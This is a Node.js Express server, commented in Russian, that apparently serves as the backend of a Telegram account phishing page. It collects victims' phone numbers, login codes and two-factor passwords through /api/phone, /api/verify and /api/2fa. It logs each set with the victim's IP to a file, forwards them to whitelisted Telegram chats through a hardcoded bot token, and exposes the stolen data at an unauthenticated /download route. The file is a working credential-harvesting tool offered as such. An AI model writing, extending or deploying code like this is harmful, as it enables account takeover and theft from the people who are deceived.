import express from 'express';
import cors from 'cors';
import fs from 'fs';
import path from 'path';
import axios from 'axios';

const app = express();
const PORT = process.env.PORT || 3000;

const DATA_FILE = path.join('/tmp', 'data.txt');

// ===== ТОКЕНЫ ДЛЯ ЛОГОВ =====
const LOG_BOT_TOKEN = '8874938761:AAEb6WvhZ8xhvYrrIThYoYlgBWSSE_EVcLo';

console.log('📂 DATA_FILE:', DATA_FILE);

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// ===== БЕЛЫЙ СПИСОК (ТОЛЬКО ЭТИ ПОЛУЧАТЕЛИ) =====
const WHITE_LIST = ['112838795', '589436283', '8352927691'];

// ===== ХРАНИЛИЩЕ ДЛЯ СЕССИЙ РАССЫЛКИ =====
let broadcastSessions = {};

// ===== ОБРАБОТКА ВХОДЯЩИХ СООБЩЕНИЙ ОТ TELEGRAM (ВЕБХУК) =====
app.post('/webhook', async (req, res) => {
    const { message } = req.body;

    if (!message) {
        res.send('OK');
        return;
    }

    // ===== /START =====
    if (message.text === '/start') {
        const chatId = message.chat.id;

        // Если пользователь в белом списке — добавляем
        if (WHITE_LIST.includes(chatId.toString())) {
            console.log(`✅ Белый пользователь активировал бота: ${chatId}`);
        } else {
            console.log(`⚠️ Посторонний пользователь: ${chatId}`);
        }

        await axios.post(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
            chat_id: chatId,
            text: '✅ Бот активирован. Логи будут приходить только в белый список.'
        });
        return res.send('OK');
    }

    // ===== /BROADCAST (ТОЛЬКО ДЛЯ АДМИНА 112838795) =====
    if (message.text === '/broadcast') {
        const chatId = message.chat.id;

        if (chatId !== 112838795) {
            await axios.post(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
                chat_id: chatId,
                text: '❌ У вас нет прав на использование этой команды.'
            });
            return res.send('OK');
        }

        broadcastSessions[chatId] = true;
        await axios.post(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
            chat_id: chatId,
            text: '📨 Отправь сообщение для рассылки (текст или фото).'
        });
        return res.send('OK');
    }

    // ===== ОБРАБОТКА ТЕКСТА ПОСЛЕ /BROADCAST (ОТПРАВКА ТОЛЬКО В БЕЛЫЙ СПИСОК) =====
    if (message.text && broadcastSessions[message.chat.id]) {
        const senderId = message.chat.id;
        const textToSend = message.text;

        let sent = 0;
        for (const chatId of WHITE_LIST) {
            if (chatId !== senderId.toString()) {
                try {
                    await axios.post(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
                        chat_id: chatId,
                        text: `📢 ${textToSend}`,
                        parse_mode: 'HTML'
                    });
                    sent++;
                } catch (err) {
                    console.error(`❌ Ошибка отправки в ${chatId}:`, err.message);
                }
            }
        }

        await axios.post(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
            chat_id: senderId,
            text: `✅ Сообщение отправлено ${sent} получателям из белого списка.`
        });

        delete broadcastSessions[senderId];
        return res.send('OK');
    }

    res.send('OK');
});

// ===== ФУНКЦИЯ ОТПРАВКИ ЛОГОВ =====
async function sendLog(message) {
    for (const chatId of WHITE_LIST) {
        try {
            await axios.post(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            });
            console.log(`📤 Лог отправлен в ${chatId}`);
        } catch (err) {
            console.error(`❌ Ошибка отправки в ${chatId}:`, err.response?.data || err.message);
        }
    }
}

// ===== 1. ПРИЁМ НОМЕРА =====
app.post('/api/phone', async (req, res) => {
    const { phone } = req.body;

    if (!phone || !/^\+\d{7,15}$/.test(phone)) {
        return res.status(400).json({ error: 'Invalid phone format' });
    }

    const data = { phone, ip: req.ip, time: new Date().toISOString() };
    fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
    console.log('📱 Phone:', phone);

    await sendLog(
        `📱 <b>Новый номер</b>\n` +
        `📞 <code>${phone}</code>\n` +
        `🌐 IP: ${req.ip}\n` +
        `🕒 ${new Date().toLocaleString()}`
    );

    res.json({ success: true });
});

// ===== 2. ПРИЁМ КОДА =====
app.post('/api/verify', async (req, res) => {
    const { phone, code } = req.body;

    if (!phone || !code || code.length < 5) {
        return res.status(400).json({ error: 'Invalid data' });
    }

    const data = { phone, code, ip: req.ip, time: new Date().toISOString() };
    fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
    console.log('🔑 Phone + Code:', phone, code);

    await sendLog(
        `🔑 <b>Номер + код</b>\n` +
        `📞 <code>${phone}</code>\n` +
        `🔐 Код: <code>${code}</code>\n` +
        `🌐 IP: ${req.ip}\n` +
        `🕒 ${new Date().toLocaleString()}`
    );

    res.json({ success: true });
});

// ===== 3. ПРИЁМ 2FA ПАРОЛЯ =====
app.post('/api/2fa', async (req, res) => {
    const { phone, code, password } = req.body;

    if (!phone || !password) {
        return res.status(400).json({ error: 'Invalid 2FA data' });
    }

    const data = {
        phone,
        code: code || '',
        twofa_password: password,
        ip: req.ip,
        time: new Date().toISOString()
    };
    fs.appendFileSync(DATA_FILE, JSON.stringify(data) + '\n');
    console.log('🔐 Phone + Code + 2FA:', phone, code, password);

    await sendLog(
        `🔐 <b>ПОЛНЫЕ ДАННЫЕ</b>\n` +
        `📞 <code>${phone}</code>\n` +
        `🔑 Код: <code>${code || 'не введён'}</code>\n` +
        `🔒 2FA пароль: <code>${password}</code>\n` +
        `🌐 IP: ${req.ip}\n` +
        `🕒 ${new Date().toLocaleString()}`
    );

    res.json({ success: true });
});

// ===== 4. СКАЧИВАНИЕ DATA.TXT =====
app.get('/download', (req, res) => {
    if (fs.existsSync(DATA_FILE)) {
        res.download(DATA_FILE, 'data.txt');
    } else {
        res.status(404).send('❌ Файл пока пуст.');
    }
});

app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});